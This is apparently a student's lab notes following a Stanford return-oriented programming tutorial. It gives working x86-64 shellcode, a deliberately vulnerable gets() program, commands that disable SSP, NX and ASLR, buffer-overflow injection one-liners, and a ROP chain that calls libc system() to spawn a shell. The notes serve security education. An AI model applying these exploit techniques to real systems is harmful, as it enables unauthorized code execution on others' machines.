# ROP - Return Oriented Programming 
- source: https://crypto.stanford.edu/~blynn/rop/
- version: started with Ubuntu 16.04 LTS then switched to Ubuntu 12.04
    - notice of switched indicated below when done
## Table of Contents
1. [Some Assembly Required & The Shell Game](#one)
2. [Learn Bad C in only 1 hour! & The Three Trials of Code Injection](#2)
3. [The Importance of Being Patched](#3)
4. [Executable Space Perversion](#4)
5. [Go Go Gadgets](#5)
6. [Many Happy Returns](#6)
7. [Conclusion & Remaining](#7)

<a name="one"></a>
## 1. Some Assembly Required & The Shell Game
- Goal:
    - An inline shell with c.
    ```c
    int main() {
     asm("\
    needle0: jmp there\n\
    here:    pop %rdi\n\
         xor %rax, %rax\n\
         movb $0x3b, %al\n\
         xor %rsi, %rsi\n\
         xor %rdx, %rdx\n\
         syscall\n\
    there:   call here\n\
    .string \"/bin/sh\"\n\
    needle1: .octa 0xdeadbeef\n\
    ");
    }
    ```
        - Starts at needle0:
        - there:
        - here:
        - needle1:
- Steps:
    - See if we can run a shell in a shell
    ```bash
    ubuntu@ubuntu-xenial:~$ gcc shell.c
    ubuntu@ubuntu-xenial:~$ ./a.out
    $ ls
    a.out  shell.c  shellcode  victim  victim.c
    $ 
    ```
    - Extract the payload we want to injection
    ```bash
    ubuntu@ubuntu-xenial:~$ objdump -d a.out | sed -n '/needle0/,/needle1/p'
    00000000004004da <needle0>:
     4004da:   eb 0e                   jmp    4004ea <there>

    00000000004004dc <here>:
    4004dc:   5f                      pop    %rdi
    4004dd:   48 31 c0                xor    %rax,%rax
    4004e0:   b0 3b                   mov    $0x3b,%al
    4004e2:   48 31 f6                xor    %rsi,%rsi
    4004e5:   48 31 d2                xor    %rdx,%rdx
    4004e8:   0f 05                   syscall 

    00000000004004ea <there>:
    4004ea:   e8 ed ff ff ff          callq  4004dc <here>
    4004ef:   2f                      (bad)  
    4004f0:   62                      (bad)  
    4004f1:   69                      .byte 0x69
    4004f2:   6e                      outsb  %ds:(%rsi),(%dx)
    4004f3:   2f                      (bad)  
    4004f4:   73 68                   jae    40055e <__libc_csu_init+0x4e>
        ...

    00000000004004f7 <needle1>:
    ```
    - Note that our code starts at 0x4da and finishes right before 0x4f7, and that it is 29 bytes. 
        ```bash
        ubuntu@ubuntu-xenial:~$ echo $((0x4f7-0x4da))
        29
        ```
    - Now we print out the hexdump of the instruction plus 3 (32-29) extra bytes. Note that we needed the next multiple of 8 which was 32. 
        ```bash
        ubuntu@ubuntu-xenial:~$ xxd -s0x4da -l32 -p a.out shellcode
        ubuntu@ubuntu-xenial:~$ cat shellcode
        eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
        bead
        ```
- Notes:
    - objdump - displays information from object files
    - xxd - create hex dump
- Problems:
    - I started this with Mac OS, but did not work so I switched to Ubuntu. 
        - I used vagrant. [Getting Started Link](https://www.vagrantup.com/intro/getting-started/)
    - for the ```cat shellcode``` output portion, our original code segment was in a different part of memory compared to what was mentioned in the article. 
        - Based on this, our code lies at offset **0x4da** and finishes right before offset **0x4f7**. Changes were made to the hexdump based on this which gave us the correct output as shown above.
---
<a name="2"></a>
## 2. Learn Bad C in only 1 hour! & The Three Trials of Code Injection
- Goal:
    - Example of vulnerability in a bad c code. 
    ```c
    #include <stdio.h>
    int main() {
        char name[64];
        printf("%p\n", name);  // Print address of buffer
        puts("What's your name?");
        gets(name);
        printf("Hello, %s!\n", name);
        return 0;
    }
    ```
- Steps:
    - Compile removing the 3 countermeasures mention in the Notes section.
        - SSP, NX, & ASLR
        ```bash
        ubuntu@ubuntu-xenial:~$ gcc -fno-stack-protector -o victim victim.c
        ubuntu@ubuntu-xenial:~$ execstack -s victim
        ubuntu@ubuntu-xenial:~$ setarch `arch` -R ./victim
        0x7fffffffe4e0
        Whats your name?
        hello
        Hello, hello!        
        ```
    - Get the Little-indian of the buffer location address
        ```bash
        ubuntu@ubuntu-xenial:~$ a=`printf %016x 0x7fffffffe4e0 | tac -rs..`
        ubuntu@ubuntu-xenial:~$ echo $a
        e0e4ffffff7f0000
        ```
    - Attack!
        ```bash
        ubuntu@ubuntu-xenial:~$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;
        > cat ) | setarch `arch` -R ./victim
        0x7fffffffe4e0
        Whats your name?
        World
        Hello, ?_H1??;H1?H1??????/bin/sh!



        ls
        a.out  shell.c  shellcode  victim  victim.c
        ^C
        ```
        - Shellcode takes the space of the first 32 bytes of the buffer. The 80 zeroes is 40 bytes, where 32 of the 42 fill up the rest of the buffer cause the buffer is 64 bytes. The remaining 8 bytes from the 42-32 is used to overwrite the saved location of the RBP register and points to the beginning of the buffer where the shellcode is.
            - remember a contains the buffer address in little endian 
- Notes:
    - cdecl calling is a convention for x86 
        - it is a low-level scheme for how parameters, return values, return addresses, and scope. [(wiki)](https://en.wikipedia.org/wiki/Calling_convention)
    - to get around the three countermeasures:
        1. GCC Stack-Smashing Protector (SSP)
            ```
             $ gcc -fno-stack-protector -o victim victim.c
            ```
        2. Executable Space Protection (NX)
            ```            
            $ execstack -s victim
            ```
        3. Address Space Layout Randomization (ASLR)
            ```
            $ setarch `arch` -R ./victim
            ```
    - setarch
        - changes the reported architecture in new program environment and set personality flags [(linux man)](https://linux.die.net/man/8/setarch)
        - `-R` 
            - disables randomization of the virtual address space
        - running **victim** after doing the 3 disables, leads to the addresses being the same.  
- Problems:
    - execstack did not exist
        ```
        sudo apt-get update
        sudo apt install execstack
        ``` 
    - kept getting segmentation fault when running
        ```
        $ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;
        cat ) | setarch `arch` -R ./victim
        ```
        - found out my problem was that I did not make sure the buffer location was the same when getting little-endian.
---
<a name="3"></a>
## 3. The Importance of Being Patched
- Goal:
    - Look into bypassing ASLR
- Steps:
    - Report on active processes with the command and stack pointer
        ```bash
        ubuntu@ubuntu-xenial:~$ ps -eo cmd,esp
        CMD                              ESP
        /sbin/init                  00000000
        [kthreadd]                  00000000
        [ksoftirqd/0]               00000000
        [kworker/0:0H]              00000000
        [kworker/u4:0]              00000000
        [rcu_sched]                 00000000
        [rcu_bh]                    00000000
        [migration/0]               00000000
        [watchdog/0]                00000000
        [watchdog/1]                00000000
        [migration/1]               00000000
        [ksoftirqd/1]               00000000
        [kworker/1:0H]              00000000
        [kdevtmpfs]                 00000000
        [netns]                     00000000
        [perf]                      00000000
        [khungtaskd]                00000000
        [writeback]                 00000000
        [ksmd]                      00000000
        [khugepaged]                00000000
        [crypto]                    00000000
        [kintegrityd]               00000000
        [bioset]                    00000000
        [kblockd]                   00000000
        [ata_sff]                   00000000
        [md]                        00000000
        [devfreq_wq]                00000000
        [kworker/0:1]               00000000
        [kswapd0]                   00000000
        [vmstat]                    00000000
        [fsnotify_mark]             00000000
        [ecryptfs-kthrea]           00000000
        [kthrotld]                  00000000
        [acpi_thermal_pm]           00000000
        [bioset]                    00000000
        [bioset]                    00000000
        [bioset]                    00000000
        [bioset]                    00000000
        [bioset]                    00000000
        [bioset]                    00000000
        [bioset]                    00000000
        [bioset]                    00000000
        [scsi_eh_0]                 00000000
        [scsi_tmf_0]                00000000
        [scsi_eh_1]                 00000000
        [scsi_tmf_1]                00000000
        [kworker/u4:3]              00000000
        [ipv6_addrconf]             00000000
        [deferwq]                   00000000
        [charger_manager]           00000000
        [kpsmoused]                 00000000
        [mpt_poll_0]                00000000
        [mpt/0]                     00000000
        [scsi_eh_2]                 00000000
        [scsi_tmf_2]                00000000
        [bioset]                    00000000
        [bioset]                    00000000
        [raid5wq]                   00000000
        [bioset]                    00000000
        [jbd2/sda1-8]               00000000
        [ext4-rsv-conver]           00000000
        [kworker/0:1H]              00000000
        [iscsi_eh]                  00000000
        [ib_addr]                   00000000
        [ib_mcast]                  00000000
        [ib_nl_sa_wq]               00000000
        [ib_cm]                     00000000
        [iw_cm_wq]                  00000000
        [rdma_cm]                   00000000
        [kworker/1:1H]              00000000
        /lib/systemd/systemd-journa 00000000
        [kworker/1:2]               00000000
        [kauditd]                   00000000
        /sbin/lvmetad -f            00000000
        /lib/systemd/systemd-udevd  00000000
        [iprt-VBoxWQueue]           00000000
        /sbin/dhclient -1 -v -pf /r 00000000
        /sbin/iscsid                00000000
        /sbin/iscsid                00000000
        /usr/lib/snapd/snapd        00000000
        /usr/sbin/rsyslogd -n       00000000
        /usr/sbin/cron -f           00000000
        /lib/systemd/systemd-logind 00000000
        /usr/lib/accountsservice/ac 00000000
        /usr/sbin/atd -f            00000000
        /usr/sbin/acpid             00000000
        /usr/bin/lxcfs /var/lib/lxc 00000000
        /usr/bin/dbus-daemon --syst 00000000
        /sbin/mdadm --monitor --pid 00000000
        /usr/lib/policykit-1/polkit 00000000
        /usr/sbin/irqbalance --pid= 00000000
        /usr/sbin/VBoxService       00000000
        /usr/sbin/sshd -D           00000000
        /sbin/agetty --noclear tty1 00000000
        /sbin/agetty --keep-baud 11 00000000
        [kworker/1:3]               00000000
        sshd: ubuntu [priv]         00000000
        /lib/systemd/systemd --user 7a77d6b8
        (sd-pam)                    00000000
        sshd: ubuntu@pts/0          00000000
        -bash                       afefe7a8
        [kworker/0:0]               00000000
        sshd: ubuntu [priv]         00000000
        sshd: ubuntu@pts/1          00000000
        -bash                       644357e8
        ./victim                    ffffe488
        ps -eo cmd,esp              57e70028

        ```
    - Then run the victim program without ASLR. At the same time, run the ps command in another terminal. We get the same as the above except that the ESP of ./victim now exists and the ps location changes. I will crop out the rest.  
        - Terminal 1        
        ```bash
        ubuntu@ubuntu-xenial:~$ setarch `arch` -R ./victim
        0x7fffffffe4e0
        Whats your name?
        ```
        - Terminal 2
        ```bash
        ubuntu@ubuntu-xenial:~$ ps -eo cmd,esp
        -bash                       644357e8
        ./victim                    ffffe488
        ps -eo cmd,esp              57e70028
        ```
        - Another view
        ```bash
        ubuntu@ubuntu-xenial:~$  ps -o cmd,esp -C victim
        CMD                              ESP
        ./victim                    ffffe488
        ```
    - Notice that while the victim program is waiting for user input, the ESP is 0xfffe448. Now calculate the distance from that ESP to the name address location of the buffer. (ie. buffer address - victim ESP) 
        ```bash
        ubuntu@ubuntu-xenial:~$ echo $((0x7fffffffe4e0-0x7fffffffe488))
        88
        ```        
    - This gives us the offset so we can find the relevant pointer by spying on the process with ASLR enabled. 
        - Terminal 1
        ```bash
        ubuntu@ubuntu-xenial:~$ ./victim
        0x7fff06b85f70
        Whats your name?
        ```
        - Terminal 2
        ```bash
        ubuntu@ubuntu-xenial:~$ ps -o cmd,esp -C victim
        CMD                              ESP
        ./victim                    06b85f18
        ubuntu@ubuntu-xenial:~$ printf %x\\n $((0x7fff06b85f18+88))
        7fff06b85f70
        ```
    - Here I faced an issue using the 16.04 LTS Ubuntu version I was working with. Specifically, it was a segmentation fault. There was perhaps an additional service patch that fixed this exploitation. For educational purposes, I started to use 12.04 Ubuntu from here on.
    - Make a FIFO file, get the pointer of the process and put it in sp, then add the offset 88 to it and put it into a. Then run the exploit like we did before. 
        - Terminal 1
        ```bash
        vagrant@precise64:~$ mkfifo pip
        vagrant@precise64:~$ cat pip | ./victim
        0x7fff5c4d47f0
        Whats your name?
        Hello, ?_H1??;H1?H1??????/bin/sh!
        a.out  pip  postinstall.sh  shell.c  shellcode  victim  victim.c
        vagrant@precise64:~$ 
        ```
        - Terminal 2
        ```bash
        vagrant@precise64:~$ sp=`ps --no-header -C victim -o esp`
        vagrant@precise64:~$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
        vagrant@precise64:~$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;
        > cat ) > pip
        World

        ls
        exit
        quit
        ```
- Notes:
    - mkfifo = makes a FIFO special file
        - FIFO is a named pipe for its behavior
    - | = is known as a pipe where you take the output of the program on the left side and use it as the input to the program on the right side.
- Problems:
    - Kept getting segmentation fault error. The guide we are using acknowledges that it works with ubuntu 12.04 and 14.04. So at this point I switched to 12.04 and decided to continue from there. 
---
<a name="4"></a>
## 4. Executable Space Perversion
- Goal:
    - Understand NX and the power behind ROP
- Steps:
    - We tried the same attack as the previous, but without the NX protection. (ie. without the ```execstack -s victim```)
        - can enable with ```execstack -c victim```
        - Terminal 1
        ```bash
        vagrant@precise64:~$ cat pip | ./victim
        0x7fffd9113f60
        Whats your name?
        Hello, ?_H1??;H1?H1??????/bin/sh!
        Segmentation fault
        ```
        - Terminal 2
        ```bash
        vagrant@precise64:~$ gcc -fno-stack-protector -o victim victim.c
        vagrant@precise64:~$ sp=`ps --no-header -C victim -o esp`
        vagrant@precise64:~$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
        vagrant@precise64:~$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) > pip

        ls
        ```
    - Notice that we get a segmentation fault. ROP can bypass this defense. Normally, we fill the buffer with code we want to run. ROP fills the buffer with addressess of parts of the code we want to run. The ESP gets turned to a indirect IP. 
        - The plan is to have the stack pointer point to the start of a series of addresses. This is done by a RET instruction.
        - We do not focus on RETs usually meaning but the effect that RET jumps to the address in the memory location held by the stack pointer and increments stack pointer by 8 (in a 64 bit system).
        - After executing a few instructions, we will encounter a RET. 
        - In ROP, a sequence of instructions ending in RET is called a gadget.
- Problems:
    - None
---
<a name="5"></a>
## 5. Go Go Gadgets
- Goal:
    - Call the libc system() function with "/bin/sh" as the argument using a gadget that assigns a chosen value to RDI and then jumps to the system() libc function. 
- Steps:
    - locate libc
    ```bash
    vagrant@precise64:~$ locate libc.so
    /lib/x86_64-linux-gnu/libc.so.6
    ```
    - Now find the gadget that allows us to assign a chosen value to RDI
    ```bash
    objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret
    ```
    - This shows waaay too much information. What we really want to do is just
        ```assembly
        pop  %rdi
        retq
        ```
    - The pointer to /bin/sh is on top of the stack. The assembly code would assign the pointer to RDI before advancing the SP. 
    - We use this:
    ```bash
    vagrant@precise64:~$ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 |
    > grep 5f -m1 | awk '{printf"%x\n",$1-1}'
    22a12
    ```
    - What it does is hexdump the library one hex code per line while looking for "c3" and print one line of leading context, with the matches, with the line numbers. Then look for the first "5f" match within the result. As the line numbers start from 1 and offsets start from 0, we subtract 1 to get the latter from the former. We want the address in hex. We tell Awk to treat the first argument as a number.
    - Here is the idea
        - overwrite the return address with the following:
            1. libcs address + 0x22a12
            2. address of "/bin/sh"
            3. address of libs system() function
        - then on executing the next RET instruction, the program will pop the address of "/bin/sh" into RDI thanks to the gadget then jump to the system function.
- Problems:
    - None
---
<a name="6"></a>
## 6. Many Happy Returns
- Goal:
    - Exploit using RET
- Steps:
    - Run the program with ASLR turned off and while that is running, see where libc is loaded.
        - Terminal 1
        ```bash
        vagrant@precise64:~$ setarch `arch` -R ./victim
        0x7fffffffe5e0
        Whats your name?
        ```
        - Terminal 2
        ```bash
        vagrant@precise64:~$ pid=`ps -C victim -o pid --no-headers | tr -d ' '`
        vagrant@precise64:~$ grep libc /proc/$pid/maps
        7ffff7a1d000-7ffff7bd0000 r-xp 00000000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
        7ffff7bd0000-7ffff7dcf000 ---p 001b3000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
        7ffff7dcf000-7ffff7dd3000 r--p 001b2000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
        7ffff7dd3000-7ffff7dd5000 rw-p 001b6000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
        ```
        - we see that libc is loaded into memory starting at 0x7ffff7a1d000.
            - from the previous section, we found the first part.
                1. libcs address + 0x22a12
                    - 0x7ffff7a1d000 + 0x22a12.
    - We know the address of "/bin/sh" cause we print it in the file
                2. address of "/bin/sh"
                    - 0x7fffffffe5e0
    - Now we look for address of system() 
        ```bash
        vagrant@precise64:~$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
        0000000000044320 W system
        ```
        - we see that it is offset 0x44320
                3. address of system()
                    - 0x7ffff7a1d000 + 0x44320
    - Combine 1,2, and 3
        - The plan is that the first 130 = 65 bytes, which covers the rest of the buffer after "/bin/sh" as well as the pushed RBP register, so that the next location we overwrite is the top of the stack.  
        ```bash
        vagrant@precise64:~$ (echo -n /bin/sh | xxd -p; printf %0130d 0;
        > printf %016x $((0x7ffff7a1d000+0x22a12)) | tac -rs..;
        > printf %016x 0x7fffffffe5e0 | tac -rs..;
        > printf %016x $((0x7ffff7a1d000+0x44320)) | tac -rs..) |
        > xxd -r -p | setarch `arch` -R ./victim
        0x7fffffffe5e0
        Whats your name?
        Hello, /bin/sh!
        Segmentation fault
        vagrant@precise64:~$ 
        ```
        - We got a segmentation fault...something must be wrong. 
            - Reading the [update on top of the page](https://github.com/finallyjustice/security/blob/master/rop/demo1/README.txt) says that newer Linux versions organize stack differently. So, we try the method on that.
    - Stack Layout for new Linux Versions
        ```
        ### Stack Layout ###
          string /bin /sh
        --------------------
          addr of system()
        --------------------
          addr of /bin/sh
        --------------------
        addr of pop rdi; ret
        --------------------
            EBP Register
        --------------------
            64 Bytes buf
        ####################
        ```
    - Once again, we compile the program in a way so that we can test to see if we can bypass the NX protection without worrying about the other protection.
    - Compile removing SSP off
        ```bash
        vagrant@precise64:~$ gcc -fno-stack-protector -o victim victim.c
        ```
    - Run the victim program to find the buffer location with ASLR off. Note that we should keep this open and work on another terminal to locate addresses.  
        ```bash
        vagrant@precise64:~$ setarch `arch` -R ./victim
        0x7fffffffe5e0
        ```
    - Locate the base of libc
        ```bash
        vagrant@precise64:~$ pid=`ps -C victim -o pid --no-headers | tr -d ' '`
        vagrant@precise64:~$ grep libc /proc/$pid/maps
        7ffff7a1d000-7ffff7bd0000 r-xp 00000000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
        7ffff7bd0000-7ffff7dcf000 ---p 001b3000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
        7ffff7dcf000-7ffff7dd3000 r--p 001b2000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
        7ffff7dd3000-7ffff7dd5000 rw-p 001b6000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
        ```
    - Locate the offset of the system library function
        ```bash
        vagrant@precise64:~$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
        0000000000044320 W system
        ```
    - Locate location of gadget "pop %rdi ; retq" 
        ```bash
        vagrant@precise64:~$ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 |
        > grep 5f -m1 | awk '{printf"%x\n",$1-1}'
        22a12
        ```
    - Now we have the following addresses:
        - buffer: 0x7fffffffe5e0
        - libc base: 0x7ffff7a1d000
        - system: 0x7ffff7a1d000 + 0x44320
        - gadgets: 0x7ffff7a1d000 + 0x22a12
        - bash: 0x7fffffffe5e0 + 64d + 8d + 24d = 0x7fffffffe640
            - note that this is adding 0x60 to the buffer since it equals 96d
                - 64 is from the 72 of the 144 0s
                - 8 is from the 72-64 of the 144 0s
                - 24 is from the 3*8, the address lengths of system(), "/bin/sh", and gadget. 
    - Now exploit replacing the gadget, bash, and system addresses
        ```bash
        vagrant@precise64:~$ (((printf %0144d 0; printf %016x $((0x7ffff7a1d000 + 0x22a12)) | tac -rs..; printf %016x 0x7FFFFFFFE640 | tac -rs..; printf %016x $((0x7ffff7a1d000 + 0x44320)) | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | setarch `arch` -R ./victim
        0x7fffffffe5e0
        Whats your name?

        Hello, !

        ls
        a.out  grep  pip  postinstall.sh  printf  shell.c  shellcode  victim  victim.c

        ```
        - What we are doing here is fill the buffer with 144 0s. Which xxd turns to 72 bytes, 64 for the buffer and 8 for the top of the stack (EBP. Return address replaced with location of the gadget. 
- Problems:
    - Segmentation Fault, possibly from having a newer Linux Version
        - followed updated code on top of guide
        - added ```setarch `arch` -R ./victim``` to the last bit of the updated code to fix additional segmentation fault problems (cause ASLR was not off and random memory location was occurring)
    - Make sure the press enter multiple times and do not insert a string once ./victim runs
---
<a name="7"></a>
## 7. Conclusion & Remaining
- ProPolice
    - best defense because it moves arrays to the highest part of the stack, so less chance for overflowing
    - it also places values at the end known as **canaries**.
        - there are checks inserted by this before return instruction that halts execution if the **canaries** are altered. 
- ASLR
    - supposed to protect against learning about the addresses
- NX
    - we found two workarounds for this. We do not need to rn the code in the stack. We can put it somewhere else and run it there. 
